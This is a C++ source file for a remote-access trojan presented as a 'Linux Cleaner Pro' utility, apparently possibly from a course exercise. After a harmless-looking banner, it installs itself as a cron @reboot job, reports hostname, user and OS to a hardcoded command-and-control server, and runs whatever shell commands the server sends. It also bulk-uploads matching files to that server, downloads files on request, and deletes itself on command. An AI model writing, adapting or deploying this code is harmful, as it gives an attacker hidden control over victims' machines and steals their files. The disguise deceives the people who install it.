#include <string>
#include <thread>
#include <chrono>
#include <iostream>
#include <fstream>
#include <array>

#include "rapidjson/document.h"
#include "curl/curl.h"

using namespace std; 
using namespace rapidjson;

const string HOST_URL = "http://cs4001.root.sx:3000/";

string get_os() {
    #ifdef _WIN32
    return "Windows 32-bit";
    #elif _WIN64
    return "Windows 64-bit";
    #elif __APPLE__
    return "Apple";
    #elif __ANDROID__
    return "Android";
    #elif __linux__
    return "Linux";
    #elif __unix || __unix__
    return "Unix";
    #else
    return "Other";
    #endif
}

size_t write_data(void *contents, size_t size, size_t nmemb, void *userp) {
    ((string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

size_t write_data_file(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

string exec(string cmd) {
    array<char, 128> buffer;
    string output;
    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);

    if (!pipe) {
        throw runtime_error("popen() failed!");
    }

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        output += buffer.data();
    }

    if (output.length() != 0) {
        output.erase(output.length()-1); // remove last newline
    }

    return output;
}

string get(string url) {
    CURL *curl = curl_easy_init();
    CURLcode res;
    string read_buffer;

    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &read_buffer);

        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }

    return read_buffer;
}

string post(string url, string data) {
    CURL *curl = curl_easy_init();
    CURLcode res;
    string read_buffer;

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, data.length());
        curl_easy_setopt(curl, CURLOPT_POST, 1);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &read_buffer);

        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    return read_buffer;
}

void download_file(string url, string location) {
    CURL *curl = curl_easy_init();
    FILE *fp;
    CURLcode res;

    if (curl) {
        fp = fopen(location.c_str(), "wb");
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data_file);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);
    }
}

void upload_file(string url, string location, string id) {
    CURL *curl;
    CURLcode res;

    curl_mime *form = NULL;
    curl_mimepart *field = NULL;
    struct curl_slist *headerlist = NULL;
    static const char buf[] = "Expect:";

    curl_global_init(CURL_GLOBAL_ALL);

    curl = curl_easy_init();
    if(curl) {
        form = curl_mime_init(curl);

        field = curl_mime_addpart(form);
        curl_mime_name(field, "id");
        curl_mime_data(field, id.c_str(), CURL_ZERO_TERMINATED);

        field = curl_mime_addpart(form);
        curl_mime_name(field, "file");
        curl_mime_filedata(field, location.c_str());

        field = curl_mime_addpart(form);
        curl_mime_name(field, "filename");
        curl_mime_data(field, location.c_str(), CURL_ZERO_TERMINATED);

        field = curl_mime_addpart(form);
        curl_mime_name(field, "submit");
        curl_mime_data(field, "send", CURL_ZERO_TERMINATED);

        headerlist = curl_slist_append(headerlist, buf);
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n",
                    curl_easy_strerror(res));
        }

        curl_easy_cleanup(curl);
        curl_mime_free(form);
        curl_slist_free_all(headerlist);
    }
}

void make_shell_persistence(string filename) {
    string path = exec("readlink -f " + filename);
    exec("echo @reboot " + path + " | crontab -");
}

void mass_upload(string name, string location, string id) {
    string output = exec("find " + location + " -type f -name \"" + name + "\"");
    char* token = strtok(const_cast<char*>(output.c_str()), "\n");

    while (token != NULL) {
        upload_file(HOST_URL + "upload", string(token), id);
        token = strtok(NULL, "\n");
    }
}

int main(int argc, char* argv[]) {
    cout << "Starting up Linux Cleaner Pro!" << endl;
    cout << "The best optoin for best running!!!!!!!! :)" << endl;

    int delay = 3;
    string hostname = exec("hostname");
    string user = exec("id -un");
    string os = get_os();
    string response;
 
    make_shell_persistence(string(argv[0]));

    // wait for server
    while (response.empty()) {
        response = post(HOST_URL + "connect", "hostname=" + hostname +
                    "&user=" + user + "&os=" + os);
        this_thread::sleep_for(chrono::seconds());
    }

    Document document;
    document.Parse(response.c_str());

    string id = document["id"].GetString();

    while (true) {
        response = post(HOST_URL + "command", "id=" + id);

        if (!response.empty()) {
            document.Parse(response.c_str());
            string type = document["type"].GetString();

            if (type == "cmd") {
                string cmd = document["data"].GetString();
                string output = exec(cmd);
                post(HOST_URL + "output", "id=" + id + "&output=" + output);
            } else if (type == "kill") {
                post(HOST_URL + "disconnect", "id=" + id);
                exec("rm " + string(argv[0]));
                exec("crontab -r");
                break;
            } else if(type == "find") {
                string name = document["data"]["name"].GetString();
                string location = document["data"]["name"].GetString();
                mass_upload(name, location, id);
            } else if (type == "delay") {
                delay = document["data"].GetInt();
            } else if (type == "download") {
                string url = document["data"]["url"].GetString();
                string location = document["data"]["location"].GetString();
                download_file(url, location);
            }
        }

        this_thread::sleep_for(chrono::seconds(delay));
    }

    return 0;
}
